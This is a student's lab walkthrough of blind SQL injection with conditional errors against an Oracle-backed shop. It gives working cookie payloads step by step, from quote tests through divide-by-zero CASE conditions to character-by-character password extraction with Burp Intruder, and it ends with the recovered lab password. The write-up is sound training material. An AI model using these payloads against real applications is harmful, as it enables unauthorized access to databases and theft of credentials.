# Blind SQL injection with conditional errors
- Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database
- The possibilities depend largely on the configuration of the database and the types of errors you're able to trigger
- may be able to induce the application to return a specific error response based on the result of a boolean expression
- may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise blind SQL injection vulnerabilities into "visible" ones
- it is often possible to induce the application to return conditional responses by triggering SQL errors conditionally,
- This involves modifying the query so that it will cause a database error if the condition is true
- but not if the condition is false
- Very often, an unhandled error thrown by the database will cause some difference in the application's response (such as an error message)
- allowing us to infer the truth of the injected condition
# Lab
- blind SQL injection vulnerability
- uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie
- the application does not respond any differently based on whether the query returns any rows
- If the SQL query causes an error, then the application returns a custom error message
- The database contains a different table called users, with columns called username and password
# Goal 
- find Administartor password
- log in as administartor
# Solving The lab
- Visit the front page of the shop
- intercept and modify the request containing the TrackingId cookie
- Modify the TrackingId cookie, appending a single quotation mark to it
```
TrackingId=xyz'
```
- we see internal server error
- Now change it to two quotation marks and the error disappears
- to confirm that the server is interpreting the injection as a SQL query ,that the error is a SQL syntax error as opposed to any other kind of error
- first need to construct a subquery using valid SQL syntax
```
TrackingId=xyz'||(SELECT '')||'
```
- query still appears to be invalid maybe we are dealing with oracle db so we need to inserf from caluse
```
TrackingId=xyz'||(SELECT '' FROM dual)||'
```
- query look valid and we got a 200 response
- now submitting an invalid query while still preserving valid SQL syntax
```
TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
```
- we got internal server error
- can use this error response to infer key information about the database. For example, in order to verify that the users table exists
```
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```
- WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row
- we confirmed that users table exists because we got internal server error
- now exploit this behavior to test conditions
```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
- an error message is received
- Now change it
```
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
- the error disappears so we can trigger an error conditionally on the truth of a specific condition
- The CASE statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false.
- former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is true
- can use this behavior to test whether specific entries exist in a table
```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
- in sql the from clause executes first so in the above query it checks if the administartor is the users db then the select statment executes and we should get an error
- now to determine how many characters are in the password of the administrator user.
```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
- and iterate the process till we got 20 on 21 no error displays which means the password is shorter than 21
- now to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder.
- In the Positions tab of Burp Intruder, change the value of the cookie to
```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
- SUBSTR() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn
- now to the intruder attack like rana khalil video or like the precous lab and check for the 500 responses and we got the password
```
w4jb7vb101kkjz8h2gk5
```
